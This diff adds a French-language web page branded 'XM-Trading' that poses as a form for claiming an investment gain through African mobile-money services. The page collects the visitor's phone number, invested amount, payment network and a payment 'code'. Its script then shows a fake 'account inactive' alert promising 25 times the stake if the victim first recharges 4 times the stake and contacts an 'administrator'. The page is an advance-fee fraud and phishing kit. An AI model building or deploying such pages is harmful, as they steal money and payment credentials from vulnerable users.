@@ -1,1 +1,358 @@
+<!-- transaction.html -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Finaliser Réception du Gain</title>
+  <!-- Reprenez les styles similaires à index.html -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      height: 100%;
+    }
+    body {
+      font-family: 'Montserrat', Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow-x: hidden;
+    }
+    .container {
+      flex: 1;
+      max-width: 700px;
+      width: 100%;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 25px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      position: relative;
+      z-index: 1;
+    }
+    h2 {
+      margin-bottom: 15px;
+      font-size: 1.4rem;
+      color: #000;
+    }
+    form label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 500;
+      color: #222;
+    }
+    form input[type="text"],
+    form input[type="number"],
+    form input[type="tel"],
+    form select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    input::placeholder {
+      color: #999;
+    }
+    button, input[type="submit"] {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 500;
+      transition: background-color 0.2s ease;
+    }
+    button:hover, input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+    #code-section {
+      display: none;
+    }
+    header.site-header {
+      background-color: #000;
+      color: #fff;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    header.site-header h1 {
+      font-size: 1.5rem;
+      font-weight: 600;
+    }
+    header.site-header nav a {
+      margin-left: 20px;
+      font-weight: 500;
+      color: #fff;
+      text-decoration: none;
+    }
+    header.site-header nav a:hover {
+      color: #007bff;
+    }
+    footer.site-footer {
+      background-color: #000;
+      color: #ccc;
+      padding: 15px 20px;
+      text-align: center;
+      font-size: 0.9rem;
+    }
+    footer.site-footer a {
+      color: #007bff;
+    }
+    footer.site-footer a:hover {
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <header class="site-header">
+    <div class="logo">
+      <h1>XM-Trading Réception Gain</h1>
+    </div>
+    <nav>
+      <a href="index.html">Accueil</a>
+    </nav>
+  </header>
 
+  <div class="container">
+    <h2>Finaliser Réception du Gain</h2>
+    <form id="transaction-form">
+      <!-- Pays -->
+      <label for="country">Pays</label>
+      <select id="country" name="country" required>
+        <option value="">Sélectionnez votre pays</option>
+      </select>
+
+      <!-- Numéro de réception -->
+      <label for="receiverNumber">Numéro de réception</label>
+      <input type="tel" id="receiverNumber" name="receiverNumber" placeholder="Numéro sans indicatif" required>
+      <small id="receiverNumberHelp" style="display:block; margin-top:-10px; margin-bottom:15px; color:#555;">
+        Entrez votre numéro de téléphone pour recevoir le gain.
+      </small>
+
+      <!-- Montant investi -->
+      <label for="amount">Montant investi</label>
+      <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
+
+      <!-- Devise -->
+      <label for="currency">Devise</label>
+      <select id="currency" name="currency" required>
+        <option value="">Sélectionnez</option>
+        <option value="FCFA">FCFA</option>
+        <option value="USD">USD</option>
+      </select>
+
+      <!-- Moyen de paiement -->
+      <label for="paymentMethod">Moyen de paiement</label>
+      <select id="paymentMethod" name="paymentMethod" required>
+        <option value="">Sélectionnez</option>
+        <option value="Airtel Money">Airtel Money</option>
+        <option value="Orange Money">Orange Money</option>
+        <option value="MTN Mobile Money">MTN Mobile Money</option>
+        <option value="Wave Money">Wave Money</option>
+        <!-- Autres 10 réseaux mobiles de paiement en Afrique -->
+        <option value="Moov Money">Moov Money</option>
+        <option value="Tigo Cash">Tigo Cash</option>
+        <option value="Ecocash">Ecocash</option>
+        <option value="M-Pesa">M-Pesa</option>
+        <option value="Vodacom M-Pesa">Vodacom M-Pesa</option>
+        <option value="E-Money">E-Money</option>
+        <option value="Tigo Pesa">Tigo Pesa</option>
+        <option value="MTN Mobile Money Zimbabwe">MTN Mobile Money Zimbabwe</option>
+        <option value="ECOBANK Mobile">ECOBANK Mobile</option>
+        <option value="YUP Mobile">YUP Mobile</option>
+      </select>
+
+      <!-- Section code, masquée par défaut -->
+      <div id="code-section">
+        <label id="codeLabel" for="paymentCode">Code</label>
+        <input type="text" id="paymentCode" name="paymentCode" placeholder="Entrez le code de paiement" required>
+      </div>
+
+      <button type="submit">Finaliser</button>
+    </form>
+  </div>
+
+  <footer class="site-footer">
+    <p>&copy; 2025 XM-Trading. Tous droits réservés.</p>
+    <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
+  </footer>
+
+  <script>
+    const countryDialCodes = [
+      { name: "Bénin", code: "BJ", dial_code: "+229", phone_length: 8 },
+      { name: "Burkina Faso", code: "BF", dial_code: "+226", phone_length: 8 },
+      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225", phone_length: 10 },
+      { name: "Ghana", code: "GH", dial_code: "+233", phone_length: 9 },
+      { name: "Guinée", code: "GN", dial_code: "+224", phone_length: 9 },
+      { name: "Mali", code: "ML", dial_code: "+223", phone_length: 8 },
+      { name: "Niger", code: "NE", dial_code: "+227", phone_length: 8 },
+      { name: "Nigeria", code: "NG", dial_code: "+234", phone_length: 10 },
+      { name: "Sénégal", code: "SN", dial_code: "+221", phone_length: 8 },
+      { name: "Togo", code: "TG", dial_code: "+228", phone_length: 8 },
+      { name: "Cameroun", code: "CM", dial_code: "+237", phone_length: 9 },
+      { name: "République du Congo", code: "CG", dial_code: "+242", phone_length: 9 },
+      { name: "République démocratique du Congo", code: "CD", dial_code: "+243", phone_length: 9 },
+      { name: "Centrafrique", code: "CF", dial_code: "+236", phone_length: 8 },
+      { name: "Tchad", code: "TD", dial_code: "+235", phone_length: 8 },
+      { name: "Gabon", code: "GA", dial_code: "+241", phone_length: 8 },
+      { name: "Guinée équatoriale", code: "GQ", dial_code: "+240", phone_length: 7 },
+      { name: "São Tomé-et-Principe", code: "ST", dial_code: "+239", phone_length: 7 },
+      { name: "Madagascar", code: "MG", dial_code: "+261", phone_length: 9 },
+      { name: "Kenya", code: "KE", dial_code: "+254", phone_length: 9 },
+      { name: "Ouganda", code: "UG", dial_code: "+256", phone_length: 9 },
+      { name: "Rwanda", code: "RW", dial_code: "+250", phone_length: 9 },
+      { name: "Éthiopie", code: "ET", dial_code: "+251", phone_length: 9 },
+      { name: "Haïti", code: "HT", dial_code: "+509", phone_length: 8 },
+    ];
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Peupler le pays
+      const countrySelect = document.getElementById('country');
+      const receiverInput = document.getElementById('receiverNumber');
+      const receiverHelp = document.getElementById('receiverNumberHelp');
+      if (countrySelect) {
+        countryDialCodes.forEach(item => {
+          const option = document.createElement('option');
+          option.value = item.code;
+          option.textContent = item.name;
+          option.dataset.dialCode = item.dial_code;
+          option.dataset.phoneLength = item.phone_length;
+          countrySelect.appendChild(option);
+        });
+        countrySelect.addEventListener('change', () => {
+          const sel = countrySelect.selectedOptions[0];
+          if (sel && sel.dataset.dialCode) {
+            receiverHelp.textContent = `Entrez votre numéro sans indicatif (indicatif: ${sel.dataset.dialCode})`;
+            const len = parseInt(sel.dataset.phoneLength, 10);
+            if (!isNaN(len) && len > 0) {
+              receiverInput.maxLength = len;
+              let ex = "";
+              for (let i = 0; i < len; i++) ex += "X";
+              receiverInput.placeholder = "Ex: " + ex;
+            } else {
+              receiverInput.removeAttribute('maxlength');
+              receiverInput.placeholder = "Votre numéro sans indicatif";
+            }
+          } else {
+            receiverHelp.textContent = `Entrez votre numéro de réception`;
+            receiverInput.removeAttribute('maxlength');
+            receiverInput.placeholder = "Votre numéro sans indicatif";
+          }
+        });
+      }
+
+      // Champ moyen de paiement et code
+      const paymentMethodSelect = document.getElementById('paymentMethod');
+      const codeSection = document.getElementById('code-section');
+      const codeLabel = document.getElementById('codeLabel');
+      const paymentCodeInput = document.getElementById('paymentCode');
+      if (paymentMethodSelect) {
+        paymentMethodSelect.addEventListener('change', () => {
+          const m = paymentMethodSelect.value;
+          if (m) {
+            codeSection.style.display = 'block';
+            codeLabel.textContent = `Code ${m}`;
+            paymentCodeInput.placeholder = `Entrez le code ${m}`;
+          } else {
+            codeSection.style.display = 'none';
+            paymentCodeInput.value = '';
+          }
+        });
+      }
+
+      // Pré-remplissage montant/devise depuis index (optionnel)
+      const storedAmount = localStorage.getItem('lastInvestAmount');
+      const storedCurrency = localStorage.getItem('lastInvestCurrency');
+      if (storedAmount) {
+        document.getElementById('amount').value = storedAmount;
+      }
+      if (storedCurrency) {
+        document.getElementById('currency').value = storedCurrency;
+      }
+
+      // Soumission du formulaire
+      const form = document.getElementById('transaction-form');
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        // Validation pays
+        const countrySel = countrySelect.selectedOptions[0];
+        if (!countrySel) {
+          alert("Veuillez sélectionner votre pays.");
+          return;
+        }
+        const expectedLen = parseInt(countrySel.dataset.phoneLength, 10);
+        const receiverValue = receiverInput.value.trim();
+        if (!receiverValue) {
+          alert("Veuillez saisir votre numéro de réception.");
+          return;
+        }
+        if (!isNaN(expectedLen) && expectedLen > 0) {
+          const digitsOnly = receiverValue.replace(/\D/g, '');
+          if (digitsOnly.length !== expectedLen) {
+            alert(`Le numéro de réception doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
+            return;
+          }
+        }
+        // Montant
+        const amountInput = document.getElementById('amount');
+        const amount = parseFloat(amountInput.value);
+        if (isNaN(amount) || amount <= 0) {
+          alert("Veuillez saisir un montant investi valide.");
+          return;
+        }
+        // Devise
+        const currencySelect = document.getElementById('currency');
+        const currency = currencySelect.value;
+        if (!currency) {
+          alert("Veuillez sélectionner une devise.");
+          return;
+        }
+        // Moyen de paiement
+        const paymentMethod = paymentMethodSelect.value;
+        if (!paymentMethod) {
+          alert("Veuillez sélectionner un moyen de paiement.");
+          return;
+        }
+        // Code paiement
+        if (codeSection.style.display === 'block') {
+          const codeValue = paymentCodeInput.value.trim();
+          if (!codeValue) {
+            alert("Veuillez saisir le code de paiement.");
+            return;
+          }
+        }
+        // Calculs
+        let bonusValue = amount * 25;
+        let rechargeValue = amount * 4;
+        if (currency === 'USD') {
+          bonusValue = Math.round(bonusValue * 100) / 100;
+          rechargeValue = Math.round(rechargeValue * 100) / 100;
+        } else {
+          bonusValue = Math.round(bonusValue);
+          rechargeValue = Math.round(rechargeValue);
+        }
+        // Alerte
+        const message =
+          `Alerte : votre compte ${paymentMethod} est inactif pour recevoir votre gain !\n\n` +
+          `Pour recevoir vos ${bonusValue} ${currency}, vous devez recharger un montant de ${rechargeValue} ${currency} dans votre compte ${paymentMethod}.\n\n` +
+          `Une fois la recharge effectuée, contactez votre administrateur pour finaliser votre paiement ! Merci`;
+        alert(message);
+        // Éventuellement reset ou autre action
+      });
+    });
+  </script>
+</body>
+</html>
